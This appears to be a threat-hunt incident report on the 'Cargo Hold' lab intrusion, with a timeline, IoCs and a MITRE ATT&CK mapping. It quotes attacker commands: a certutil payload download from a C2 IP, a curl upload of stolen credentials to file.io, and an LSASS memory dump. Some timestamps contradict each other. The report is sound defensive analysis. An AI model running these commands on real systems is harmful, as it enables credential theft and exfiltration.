<img width="740" height="1110" alt="image" src="https://github.com/user-attachments/assets/2fb944a4-843c-4169-8b62-f8996a89fcfe" />

# Threat Hunt: Cargo Hold

---

## Index
- [Executive Summary](#executive-summary)
- [Technical Analysis](#technical-analysis)
  - [Affected Systems & Data](#affected-systems--data)
  - [Evidence Sources & Analysis](#evidence-sources--analysis)
- [Indicators of Compromise (IoCs)](#indicators-of-compromise-iocs)
- [Root Cause Analysis](#root-cause-analysis)
- [Technical Timeline](#technical-timeline)
- [Nature of the Attack](#nature-of-the-attack)
- [Impact Analysis](#impact-analysis)
- [Response and Recovery Analysis](#response-and-recovery-analysis)
  - [Immediate Response Actions](#immediate-response-actions)
  - [Eradication Measures](#eradication-measures)
  - [Recovery Steps](#recovery-steps)
  - [Post-Incident Actions](#post-incident-actions)
- [Annex A](#annex-a)
  - [Technical Timeline](#technical-timeline-1)
  - [MITRE ATT&CK Technique Mapping](#mitre-attck-technique-mapping--technical-timeline)

## Executive Summary
**Incident ID:** 
- INC2025-0011-019
**Incident Severity:**
- Severity 1 (Critical) 
**Security Analyst**
- Albert Romero
**Incident Status:**
- Resolved

On November 19, 2025, an unauthorized entity gained initial access to the environment and remained dormant for approximately 72 hours before returning at `2025-11-22T00:27:58.4166424Z`. This dwell time, followed by renewed activity, was indicative of hands-on-keyboard attacker behavior rather than automated malware execution.

Upon returning, the attacker leveraged compromised credentials to perform lateral movement, targeting internal systems and ultimately accessing the critical file server `azuki-fileserver01`. Activity observed during this phase included network and privilege enumeration, credential harvesting, data staging, and outbound data exfiltration. The attacker relied heavily on built-in Windows utilities and legitimate cloud services to blend into normal system activity and reduce the likelihood of detection.

Evidence further showed attempts to establish persistence and evade forensic analysis, including registry autorun modifications, tool renaming to evade signature-based detection, and deletion of PowerShell command history. These actions demonstrate deliberate operational security practices intended to maintain access and obscure investigative artifacts.

This threat hunt confirmed a coordinated intrusion involving credential abuse, living-off-the-land techniques, and data exfiltration. The incident was contained through rapid isolation of affected systems, credential revocation, and network controls, followed by eradication and recovery actions to restore the environment to a trusted state.

## Key Findings:
Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumeration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensive evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>

The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection.<br>

Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io` which uses the cloud file sharing service file.io. Registry autorun keys were created for persistence with the registry value name `FileShareSync` which used the process `svchost.ps1` to masquerade the malicious files as legitimate Windows components to avoid suspicion. As an attempt at anti-forensics, the malicious actor then targeted the PowerShell command history `ConsoleHost_history.txt` for deletion.

## Immediate Actions:
- The SOC and DFIR teams exclusively managed the incident response procedures internally. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data which included network traffic capture files. Additionally, all affected systems were plugged to a host security solution and all event logs were automatically collected by the existing SIEM.

## Stakeholder Impact:
### Customers:
- The credentials of IT accounts were exfiltrated and there is a potential that customer information may have been impacted as well. Impersonations of IT staff and the possibility of customer data being at risk are a possibility. Concerns with confidentiality of customer data is a priority and as a precautionary measure, some services were temporarily taken offline. The financial implications of this downtime are currently being assessed but could result in the loss of revenue and customer trust.

### Employees:
- The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The administrative account `fileadmin` has had indications of compromise and was utilized in this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.

### Business Partners:
- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may be ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.

### Regulatory Bodies:
- The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.

### Shareholders:
- This incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of remedial actions taken and the company's ability to restore stakeholder confidence.

## Technical Analysis

### Affected Systems & Data

Following the initial compromise, the attacker was able to move laterally due to insufficient network access controls and limited segmentation between user workstations and critical infrastructure. After re-entering the environment, the attacker focused on systems that provided elevated access and centralized data storage.

**Affected Devices:**
- `azuki-sl` — Initial access and staging point for lateral movement
- `azuki-fileserver01` — Critical file server targeted for data access and exfiltration

**Compromised Accounts:**
- `kenji.sato` — User account leveraged for initial access and lateral movement
- `fileadmin` — Administrative account abused for privilege escalation and expanded access

The compromise of the administrative account significantly increased the attacker’s ability to enumerate network resources, access sensitive data, and execute actions across the environment. The file server contained sensitive internal and administrative data, making it a high-value target for credential harvesting and data exfiltration.

### Evidence Sources & Analysis

Security telemetry and network monitoring identified the attacker returning to the environment on November 22, 2025, approximately 72 hours after the initial compromise. This delayed re-entry aligns with common attacker dwell-time behavior, where access is validated before expanded operations begin.

<img width="1168" height="304" alt="image" src="https://github.com/user-attachments/assets/bd9e8334-3d45-45f3-87eb-d2d452ae764d" />

A successful logon from the external IP address `159.26.106.98` was observed on the device `azuki-sl` using the compromised account `kenji.sato` at `2025-11-22T00:27:58.4166424Z`. This event marked the beginning of active attacker operations within the environment.

<img width="1968" height="498" alt="image" src="https://github.com/user-attachments/assets/ec2d9532-d6c5-46cf-b2e4-656478fc04dd" />

Following initial access, the attacker performed lateral movement using Remote Desktop Protocol (RDP), observed through the execution of `mstsc.exe`. This indicates deliberate, interactive access rather than automated malware propagation.

<img width="1781" height="553" alt="image" src="https://github.com/user-attachments/assets/74724b07-62a7-4bf4-a785-416eb6a43c1b" />

Additional queries for remote logon activity revealed unauthorized access to the critical file server `azuki-fileserver01`.

<img width="1816" height="488" alt="image" src="https://github.com/user-attachments/assets/fcc5792a-a78c-44de-9fa7-00a9b9c77d53" />

Once access to the file server was established, the attacker transitioned to the administrative account `fileadmin`, enabling elevated privileges for further discovery and data access.

<img width="1756" height="543" alt="image" src="https://github.com/user-attachments/assets/237afb96-5af7-439a-a50a-8b92fa8077ea" />

At `2025-11-22T00:40:54.8271951Z`, the attacker initiated network share enumeration using the command `"net.exe" share`, followed by enumeration of remote systems using `"net.exe" view \\10.1.0.188`. These commands were used to identify accessible file shares and data repositories across the internal network.

<img width="1587" height="432" alt="image" src="https://github.com/user-attachments/assets/381aee74-2986-4a2c-960a-b84ff2c934fe" />

Privilege enumeration continued using native Windows utilities such as `"whoami.exe" /all` to assess group membership and available privileges.

<img width="1529" height="397" alt="image" src="https://github.com/user-attachments/assets/1bd58659-5f3f-463e-9eb0-53a083a512b3" />

Network configuration discovery followed using `"ipconfig.exe" /all`, allowing the attacker to further scope the environment and identify additional network segments.

<img width="1558" height="397" alt="image" src="https://github.com/user-attachments/assets/32e20007-5f59-46d0-b5ce-c22fd74fa1a0" />

### Staging, Tooling, and Exfiltration

After completing network and privilege enumeration, the attacker prepared the environment for data collection and exfiltration by creating a local staging area. A directory was created at `C:\Windows\Logs\CBS` and deliberately hidden using file attribute modification to reduce visibility to users and basic security tooling.

<img width="1877" height="538" alt="image" src="https://github.com/user-attachments/assets/c788caaf-38fd-4a27-8e2e-6eda6d9ddf54" />

To retrieve additional tooling, the attacker leveraged a living-off-the-land binary with network capabilities. The PowerShell script `ex.ps1` was downloaded using `certutil.exe`, establishing outbound communication with the command-and-control (C2) server `78.141.196.6`.

```text```
certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1

<img width="1409" height="524" alt="image" src="https://github.com/user-attachments/assets/b59ab898-9cb3-4387-a55d-48f06d0fafed" />

Once executed, the script facilitated credential collection and preparation of data for exfiltration. A credential file named `IT-Admin-Passwords.csv` was created within the staging directory, indicating the attacker’s focus on harvesting administrative credentials.

<img width="1977" height="517" alt="image" src="https://github.com/user-attachments/assets/a956cee7-d900-4ed6-801a-baeb992e2a2a" />

To stage additional data from the network, the attacker used the built-in utility `xcopy.exe` to recursively copy files from a network share while preserving attributes and directory structure. This approach reduces the likelihood of triggering alerts compared to custom tooling.

<img width="1838" height="491" alt="image" src="https://github.com/user-attachments/assets/db3dc076-d115-4175-a55d-d5d46e586394" />

The collected data was then compressed using `tar.exe`, a cross-platform archiving tool, to create a portable archive suitable for exfiltration.

<img width="1182" height="335" alt="image" src="https://github.com/user-attachments/assets/7e6d67df-9838-4aca-8e79-553c9d68cae5" />

To evade signature-based detection, the credential dumping utility was renamed to `pd.exe`. This basic operational security technique was used prior to extracting credentials from process memory.

<img width="1542" height="392" alt="image" src="https://github.com/user-attachments/assets/4cdeab92-9dfe-490b-be4e-89c7404f5bf4" />

Credential extraction was performed by dumping the memory of the LSASS process, resulting in the creation of `lsass.dmp` within the staging directory. This confirms direct access to sensitive authentication material.

<img width="1950" height="506" alt="image" src="https://github.com/user-attachments/assets/8bc85ab9-3341-4ce2-bb92-f45347318603" />

Exfiltration was carried out using the native utility `curl.exe` to upload the compressed archive to the cloud file-sharing service `file.io`. The use of a legitimate third-party service allowed the attacker to blend outbound traffic with normal web activity.

<img width="1973" height="472" alt="image" src="https://github.com/user-attachments/assets/ff379502-3cc9-4687-a2e0-0971ff6cafba" />

## Indicators of Compromise (IoCs)

The following indicators were identified during the investigation and should be treated as high-confidence signals of malicious activity within the environment.

### Command-and-Control (C2) Infrastructure
- **IP Address:** `78.141.196.6`

### Malicious Files
- **Filename:** `ex.ps1`  
- **SHA-256 Hash:** `52749f37ff21af7fa72c2f6256df11740bb88b61eb5b6bf946d37a44a201435f`

### Staging Directory
- **Path:** `C:\Windows\Logs\CBS\`  
  - Used to store malicious tooling, staged data, credential files, and memory dumps
  - Directory attributes were modified to reduce visibility and evade detection

These indicators should be incorporated into endpoint detection rules, network monitoring, and threat intelligence feeds to help identify similar activity in the future.

## Root Cause Analysis

The root cause of this incident was insufficient network segmentation and identity access controls, which allowed the attacker to move laterally after initial access and escalate privileges without encountering meaningful barriers.

Initial access was traced back to a previously identified incident (“Port of Entry”), in which credentials associated with a user account were compromised. After a dwell period of approximately 72 hours, the attacker returned and leveraged that access to enumerate network resources and identify high-value targets.

Once administrative credentials were obtained, the lack of strict privilege boundaries enabled the attacker to access the critical file server `azuki-fileserver01`, stage sensitive data, and perform credential harvesting. Inadequate monitoring of administrative account usage and limited detection coverage for living-off-the-land techniques further reduced the likelihood of early detection.

The absence of a zero-trust security model and limited internal segmentation significantly expanded the attacker’s effective attack surface. Stronger identity governance, network isolation of critical assets, and earlier detection of anomalous administrative activity could have limited or prevented the scope of this intrusion.

## Technical Timeline

The following timeline summarizes the key phases of the intrusion, from attacker re-entry through containment and recovery. All timestamps are in UTC and were derived from correlated endpoint, network, and security telemetry.

### Initial Re-Entry and Lateral Movement
- **2025-11-22T00:27:58.4166424Z** — The attacker reconnected from external IP `159.26.106.98` after an approximate 72-hour dwell period, using the compromised account `kenji.sato`.  
- **2025-11-22T00:40:54.8271951Z** — Network share enumeration began using `"net.exe" share`.  
- **2025-11-22T00:42:01.9579347Z** — Remote share discovery performed using `"net.exe" view \\10.1.0.188"`.  
- **2025-11-22T00:42:24.1217046Z** — Privilege enumeration executed via `"whoami.exe /all"`.  
- **2025-11-22T00:42:46.3655894Z** — Network configuration discovery conducted using `"ipconfig.exe /all"`.

### Staging, Credential Access, and Exfiltration
- **2025-11-22T00:55:43.9986049Z** — Hidden staging directory created at `C:\Windows\Logs\CBS` using file attribute modification.  
- **2025-11-22T00:56:47.4100711Z** — PowerShell payload `ex.ps1` downloaded via `certutil.exe` from C2 IP `78.141.196.6`.  
- **2025-11-22T01:07:53.6430063Z** — Network share data staged using `xcopy.exe`.  
- **2025-11-22T01:07:53.6746323Z** — Credential file `IT-Admin-Passwords.csv` created within the staging directory.  
- **2025-11-22T01:30:10.0981853Z** — Collected data compressed using `tar.exe`.  
- **2025-11-22T02:03:19.9845969Z** — Credential dumping tool renamed to `pd.exe` to evade detection.  
- **2025-11-22T02:24:44.3906047Z** — LSASS memory dump performed, resulting in `lsass.dmp`.  
- **2025-11-22T01:59:54.2755596Z** — Exfiltration executed using `curl.exe` to upload data to `file.io`.

### Persistence and Anti-Forensics
- **2025-11-22T02:10:50.7952326Z** — Registry autorun value `FileShareSync` created to establish persistence.  
- **2025-11-22T02:10:50.7952326Z** — Obfuscated PowerShell script `svchost.ps1` identified as persistence mechanism.  
- **2025-11-22T02:26:01.1661095Z** — PowerShell command history file `ConsoleHost_history.txt` deleted to hinder forensic analysis.

## Nature of the Attack

The activity observed during this incident reflects a hands-on-keyboard intrusion carried out by an unauthorized actor with a working understanding of Windows environments, administrative tooling, and operational security practices.

Rather than deploying custom malware, the attacker relied heavily on **living-off-the-land techniques**, abusing legitimate Windows binaries and built-in utilities to perform discovery, credential access, data staging, and exfiltration. Tools such as `mstsc.exe`, `net.exe`, `whoami.exe`, `ipconfig.exe`, `certutil.exe`, `xcopy.exe`, `tar.exe`, and `curl.exe` were used to blend malicious activity into normal system behavior and reduce the likelihood of detection.

Defense evasion was evident through multiple techniques, including:
- Modification of file system attributes to hide the staging directory
- Renaming of credential dumping tools to evade signature-based detection
- Use of legitimate cloud-based file-sharing services for exfiltration
- Deletion of PowerShell command history to limit forensic visibility

Persistence was established through registry autorun modifications using a value name designed to appear legitimate, coupled with an obfuscated PowerShell script masquerading as a Windows system component. These actions indicate deliberate attempts to maintain long-term access while minimizing suspicion.

Overall, the tactics, techniques, and procedures observed are consistent with a post-compromise intrusion focused on credential harvesting, data theft, and persistence, rather than opportunistic or automated malware activity.

## Impact Analysis

The incident posed significant risk to the confidentiality, integrity, and availability of internal systems and sensitive data. The compromise of both user and administrative credentials enabled the attacker to access critical infrastructure and perform actions that could have resulted in broader organizational impact if not contained.

From a security perspective, the exposure of administrative credentials created the potential for continued unauthorized access, privilege abuse, and impersonation of trusted IT personnel. This increased the risk of follow-on attacks, including lateral movement into additional systems, persistence across reboots, and further data exfiltration.

The targeting of the file server `azuki-fileserver01` elevated the overall impact of the incident, as the system contained sensitive internal data and credentials. Unauthorized access to this server introduced the risk of data loss, intellectual property exposure, and compromise of information belonging to internal stakeholders and external partners.

Operationally, containment and remediation efforts required temporary isolation of affected systems, credential resets, and service disruptions. While necessary to protect the environment, these actions carried short-term operational costs and required coordinated response from security and IT teams.

Overall, the incident underscores the importance of protecting administrative credentials, limiting lateral movement opportunities, and monitoring for anomalous use of legitimate tools within enterprise environments.

## Response and Recovery Analysis

### Immediate Response Actions

Upon detection of unauthorized activity, the SOC and DFIR teams initiated immediate response actions to contain the threat and prevent further lateral movement or data exfiltration.

**Identification of Compromised Assets:**  
Security telemetry and advanced hunting identified suspicious activity associated with the following systems and accounts:

**Affected Devices:**
- `azuki-sl`
- `azuki-fileserver01`

**Compromised Accounts:**
- `kenji.sato`
- `fileadmin`

**Containment Timeline:**  
Unauthorized activity was confirmed at `2025-11-22T00:27:58.4166424Z`. By November 23, 2025, at `07:30:56`, containment actions were completed, including blocking outbound communication to known malicious infrastructure.

**Access Revocation Measures:**
- Firewall rules were updated to block the identified C2 IP address
- Active Directory policies were enforced to terminate active sessions
- Credentials associated with compromised accounts were reset
- Forced logoff actions were applied across affected systems

These immediate response actions successfully halted attacker activity, prevented additional lateral movement, and stopped further data exfiltration while allowing the investigation to proceed in a controlled manner.

### Eradication Measures

Following containment, eradication efforts focused on removing malicious artifacts, eliminating persistence mechanisms, and ensuring the environment was free of unauthorized access.

**Malware and Tool Removal:**
- Endpoint forensics identified malicious scripts, renamed credential dumping tools, and persistence mechanisms associated with the intrusion
- All identified malicious files, including the PowerShell payload and obfuscated executables, were removed from affected systems
- Registry autorun entries used for persistence were deleted to prevent re-execution on system startup

**Credential Remediation:**
- Credentials for all compromised and potentially exposed accounts were reset
- Administrative access was reviewed and temporarily restricted to reduce further risk during remediation
- Additional credential hygiene checks were performed to identify reuse or weak authentication patterns

**Verification Activities:**
- Follow-up endpoint scans were conducted to confirm removal of malicious artifacts
- Registry and scheduled task locations were reviewed to ensure no persistence mechanisms remained
- Network telemetry was monitored to verify the absence of outbound connections to known malicious infrastructure

These actions ensured that attacker tooling, persistence mechanisms, and compromised credentials were fully removed prior to system restoration.

### Recovery Steps

After eradication was completed and the environment was verified to be free of malicious artifacts, recovery actions were initiated to safely restore affected systems to operational status.

**System Restoration:**
- Affected systems were restored from known-good, verified backups
- Backup integrity was validated prior to restoration to ensure no malicious artifacts were reintroduced
- Restored systems were brought online in a controlled manner to monitor for anomalous behavior

**Data Integrity Validation:**
- Cryptographic hashing (SHA-256) was used to verify the integrity of restored files
- Access permissions on restored data were reviewed to ensure proper enforcement of least-privilege principles
- Critical services hosted on the file server were tested to confirm normal functionality

**Operational Verification:**
- Systems underwent post-recovery health checks, including service availability and performance validation
- Authentication and authorization workflows were tested to ensure credential remediation was effective
- Network connectivity was monitored to confirm no unauthorized outbound communications persisted

These recovery steps ensured that systems were restored to a trusted state while minimizing the risk of reinfection or residual attacker access.

### Post-Incident Actions

Following recovery, post-incident actions were implemented to strengthen the security posture of the environment and reduce the likelihood of similar intrusions in the future.

**Enhanced Monitoring and Detection:**
- Expanded threat hunting coverage to include detection of living-off-the-land techniques observed during this incident
- Implemented additional alerting for anomalous use of administrative tools and credential access behavior
- Increased visibility into PowerShell activity, including command-line logging and history monitoring

**Access Control Improvements:**
- Reviewed and refined administrative access to ensure least-privilege enforcement
- Strengthened identity governance controls to reduce the risk of credential misuse
- Implemented stricter monitoring of privileged account activity across critical systems

**Network and Infrastructure Hardening:**
- Improved internal network segmentation to limit lateral movement opportunities
- Isolated critical infrastructure, such as file servers, from user workstations
- Updated firewall and egress controls to better detect and block suspicious outbound traffic

**Lessons Learned and Process Updates:**
- Conducted a gap analysis to identify weaknesses in detection, segmentation, and access controls
- Updated incident response procedures based on observed attacker behavior
- Prioritized security awareness initiatives to reduce the risk of credential compromise

These post-incident actions focus on reducing attacker dwell time, improving detection of subtle tradecraft, and strengthening overall defensive resilience.

## Annex A

### Technical Timeline

| Time (UTC) | Activity |
|------------|----------|
| `2025-11-22T00:27:58.4166424Z` | Attacker returned from external IP `159.26.106.98` after approximately 72 hours of dwell time following initial compromise. |
| `2025-11-19T19:10:49.2285576Z` | Lateral movement observed from compromised host to file server `azuki-fileserver01` using `mstsc.exe` (RDP). |
| `2025-11-19T19:10:49.2662627Z` | Unauthorized access to administrative account `fileadmin` detected with an unknown logon type. |
| `2025-11-22T00:40:54.8271951Z` | Network share enumeration executed using `"net.exe" share`. |
| `2025-11-22T00:42:01.9579347Z` | Remote share enumeration performed with `"net.exe" view \\10.1.0.188"`. |
| `2025-11-22T00:42:24.1217046Z` | Privilege enumeration conducted using `"whoami.exe" /all`. |
| `2025-11-22T00:42:46.3655894Z` | Network configuration discovery executed via `"ipconfig.exe" /all`. |
| `2025-11-22T00:55:43.9986049Z` | Staging directory `C:\Windows\Logs\CBS` created and hidden using `attrib.exe +h +s`. |
| `2025-11-22T00:56:47.4100711Z` | PowerShell payload `ex.ps1` downloaded using `certutil.exe` from C2 server `78.141.196.6`. |
| `2025-11-22T01:07:53.6746323Z` | Credential file `IT-Admin-Passwords.csv` created within staging directory. |
| `2025-11-22T01:07:53.6430063Z` | Data staged from network share using `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. |
| `2025-11-22T01:30:10.0981853Z` | Collected data compressed using `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz`. |
| `2025-11-22T02:03:19.9845969Z` | Credential dumping tool renamed to `pd.exe` to evade detection. |
| `2025-11-22T02:24:44.3906047Z` | LSASS memory dump created using `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`. |
| `2025-11-22T01:59:54.2755596Z` | Data exfiltrated using `"curl.exe" -F file=@credentials.tar.gz https://file.io`. |
| `2025-11-22T02:10:50.7952326Z` | Registry autorun value `FileShareSync` added to establish persistence. |
| `2025-11-22T02:10:50.7952326Z` | Obfuscated PowerShell script `svchost.ps1` identified as persistence mechanism. |
| `2025-11-22T02:26:01.1661095Z` | PowerShell history file `ConsoleHost_history.txt` deleted as an anti-forensic measure. |

## MITRE ATT&CK Technique Mapping – Technical Timeline

The following table maps observed attacker activity to relevant MITRE ATT&CK tactics and techniques, based on correlated telemetry and investigative findings.

| Time (UTC) | Activity Summary | Tactic | Technique ID | Technique Name | Justification |
|-----------|------------------|--------|--------------|----------------|---------------|
| 2025-11-22 00:27 | Return connection after ~72-hour dwell time from new IP | Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Delayed callback behavior consistent with C2 communication over common web protocols |
| 2025-11-19 19:10 | RDP lateral movement using `mstsc.exe` | Lateral Movement | T1021.001 | Remote Services: RDP | Successful interactive logons from compromised host to file server |
| 2025-11-19 19:10 | Unauthorized access to administrative account `fileadmin` | Privilege Escalation / Credential Access | T1078 | Valid Accounts | Abuse of legitimate administrative credentials |
| 2025-11-22 00:40 | Network share enumeration via `net.exe share` | Discovery | T1135 | Network Share Discovery | Enumerated accessible local SMB shares |
| 2025-11-22 00:42 | Remote share discovery using `net.exe view` | Discovery | T1135 | Network Share Discovery | Identified remote network shares and file servers |
| 2025-11-22 00:42 | Privilege enumeration using `whoami.exe /all` | Discovery | T1033 | System Owner/User Discovery | Enumerated user privileges and group memberships |
| 2025-11-22 00:42 | Network configuration discovery via `ipconfig.exe /all` | Discovery | T1016 | System Network Configuration Discovery | Identified network interfaces and environment layout |
| 2025-11-22 00:55 | Hidden staging directory created | Defense Evasion | T1564.001 | Hide Artifacts: Hidden Files and Directories | File attributes modified to conceal attacker artifacts |
| 2025-11-22 00:55 | Local data staging | Defense Evasion | T1074.001 | Data Staged: Local Data Staging | Organized stolen data prior to exfiltration |
| 2025-11-22 00:56 | Payload download via `certutil.exe` | Command and Control | T1105 | Ingress Tool Transfer | Living-off-the-land binary used to retrieve malicious script |
| 2025-11-22 01:07 | Credential file creation | Credential Access | T1555 | Credentials from Password Stores | Collected administrative credentials for later use |
| 2025-11-22 01:07 | Data collection from network share | Collection | T1039 | Data from Network Shared Drive | Copied sensitive data from internal file server |
| 2025-11-22 01:30 | Data compression via `tar.exe` | Collection | T1560.001 | Archive Collected Data | Prepared stolen data for efficient exfiltration |
| 2025-11-22 02:03 | Tool renaming to evade detection | Defense Evasion | T1036.005 | Masquerading: Match Legitimate Name | Renamed credential dumping tool to avoid signatures |
| 2025-11-22 02:24 | LSASS memory dump | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Extracted credentials directly from process memory |
| 2025-11-22 01:59 | Data exfiltration via `curl.exe` | Exfiltration | T1567.002 | Exfiltration Over Web Services | Uploaded data to third-party cloud service |
| 2025-11-22 01:59 | Use of cloud file-sharing service | Exfiltration | T1567 | Exfiltration Over Web Services | Leveraged legitimate service to blend exfiltration traffic |
| 2025-11-22 02:10 | Registry autorun persistence | Persistence | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Established persistence through registry modification |
| 2025-11-22 02:10 | Masqueraded PowerShell persistence | Defense Evasion | T1036.003 | Masquerading: Rename System Utilities | Script disguised as legitimate Windows component |
| 2025-11-22 02:26 | PowerShell history deletion | Defense Evasion | T1070.003 | Indicator Removal on Host: Clear Command History | Removed forensic artifacts to hinder investigation |

---



